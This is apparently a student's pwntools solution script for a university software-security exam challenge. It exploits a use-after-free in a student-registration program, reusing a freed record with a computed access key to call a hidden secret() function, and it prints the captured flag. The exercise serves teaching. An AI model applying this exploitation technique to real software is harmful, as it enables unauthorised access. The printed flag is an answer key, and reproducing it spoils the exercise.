import pwn

# Feedback: I think this is an optimal exam task. Took me roughly an hour. It is one concept to understand and straighforward to exploit. This kind of task really tests our understanding (as an exam should) and has no unnessasary things that just make life harder.

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33267)
#conn = pwn.remote('127.0.0.1', 1024)

# wait for user input (in this time, connect gdb)
#pwn.pause()


# we need to create a student with access_level 84874732 and then call secret(), then we win

# student and exam_reg are the same datastructures from the data point of view

# so create a exam reg, with registration key: 84874732

# there is a use after free, delete_student deletes the student, but does not remove it from linked list

def create_student():
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Name: ', b'Tim')
    conn.sendlineafter(b'RUB ID: ', b'108020212831')
    # we could extract the pointer into heap, but this is not required for this task

def delete_student_at(index):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Index: ', str(index).encode('utf-8'))

def register_student_to_exam():
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Name: ', b'Attacker')
    conn.sendlineafter(b'RUB ID: ', b'108020212831')
    magic_key = 0xdeadbeef ^ 0xdba2ab03
    conn.sendlineafter(b'Registration Key: ', str(magic_key).encode('utf-8'))

def call_secret():
    conn.sendlineafter(b'> ', b'42')
    conn.sendlineafter(b'Index: ', b'0')


# 1) create student


# 2) delete student


# 3) register student with key = 84874732 (reuses the memory area of student, which is still in linked list)


# 4) call secret

create_student()
delete_student_at(0)
register_student_to_exam()
call_secret()

# flag is printed: softsec{qFiRajMfBZfK4-XRAKQIF907MeWVKQl0KWaqnz_1HNNsdXRGbk27cJaQqYn987ig}
conn.interactive()